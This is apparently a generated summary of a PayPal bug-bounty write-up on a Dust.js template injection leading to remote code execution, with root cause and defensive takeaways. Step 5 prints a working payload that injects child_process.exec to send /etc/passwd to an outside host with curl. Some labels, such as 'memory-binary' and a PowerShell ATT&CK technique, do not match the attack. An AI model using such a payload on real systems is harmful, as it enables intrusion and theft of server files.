# PayPal Node.js Dust.js Template Injection RCE

## Metadata
- **Source:** writeups.io
- **Date:** 2026-06-04
- **Author:** Various
- **Program:** PayPal Bug Bounty
- **Bounty:** $10,000
- **Severity:** CRITICAL
- **Vuln types:** Server-Side Template Injection (SSTI), Remote Code Execution (RCE), Unsafe eval() usage, Insufficient input validation
- **Category:** memory-binary
- **Writeup:** http://artsploit.blogspot.com/2016/08/pprce2.html

## Summary
PayPal's demo.paypal.com used the Dust.js templating engine with vulnerable 'if' helpers that internally relied on eval() for expression evaluation. By exploiting type confusion through URL parameter array syntax and bypassing quote-encoding filters, an attacker could inject arbitrary Node.js code to achieve remote code execution.

## Attack scenario (step by step)
1. Attacker performs HTTP parameter fuzzing and discovers the application responds with syntax errors for backslash (\) and newline (%0a) characters, indicating code evaluation
2. Through error messages and source code analysis, attacker identifies the application uses Dust.js templating engine with eval()-based 'if' helpers
3. Attacker discovers the application HTML-encodes single and double quotes as a sanitization measure to prevent string escape attacks
4. Attacker bypasses the string sanitization by leveraging Node.js parameter parsing to convert string parameters into arrays using array syntax (device[] parameters), which circumvent the quote-encoding function
5. Attacker crafts a payload injecting require() statements and child_process.exec() to execute system commands: device[]=x&device[]=y'-require('child_process').exec('curl -F x=`cat /etc/passwd` artsploit.com')-'
6. Server evaluates the injected code in eval(), executing the attacker's arbitrary system commands and exfiltrating sensitive files

## Root cause
The vulnerability stems from three compounding security failures: (1) use of eval() for template expression evaluation in Dust.js helpers, (2) incomplete input sanitization that only encoded quotes without validating parameter types, and (3) lack of type checking before passing user input to the encoding function, allowing array parameters to bypass the filter entirely

## Attacker mindset
Methodical fuzzer who combines reconnaissance (fuzzing all parameters), vulnerability research (examining framework source code), and deep technical knowledge (Node.js type coercion, parameter parsing). The attacker understood that simple quote-encoding bypasses are insufficient and leveraged framework-specific behavior (array parameter parsing via qs module) to circumvent defenses.

## Defensive takeaways
- Never use eval() or equivalent dynamic code evaluation functions on user-controlled input, regardless of sanitization
- Implement strict type validation before processing parameters; reject unexpected types (e.g., arrays where strings expected)
- Apply multi-layered input validation: validate type, then length, then content patterns
- Use sandboxed template engines or safer expression evaluation libraries that don't execute arbitrary code
- Whitelist allowed characters and patterns rather than blacklisting dangerous ones
- Disable eval()-based helpers in templating libraries (Dust.js deprecated these in later versions)
- Implement proper Content Security Policy (CSP) headers to limit code execution contexts
- Use static analysis tools to identify eval() calls processing user input

## Variant hunting
Similar vulnerabilities could exist in: other Node.js applications using Dust.js with enabled helpers, any framework combining eval() with insufficient input validation, applications using other templating engines with eval-based expression evaluation (Handlebars, EJS if misconfigured), services accepting array-type parameters without proper type coercion validation, legacy code using Function() constructor instead of eval()

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1059.001 - Command and Scripting Interpreter: PowerShell
- T1203 - Exploitation for Client Execution
- T1083 - File and Directory Discovery
- T1005 - Data from Local System

## Notes
This vulnerability (CVE-2016-3955) exemplifies how seemingly adequate sanitization (quote encoding) can be rendered useless by framework-specific behaviors (parameter type coercion in Node.js). The attacker's insight to test array parameters demonstrates sophisticated understanding of how web frameworks parse user input. The payload successfully exfiltrated /etc/passwd, proving full system compromise capability. PayPal patched by disabling eval-based Dust.js helpers and implementing proper input validation.

---
*Analysed by Claude (claude-haiku-4-5-20251001) on 2026-06-04*
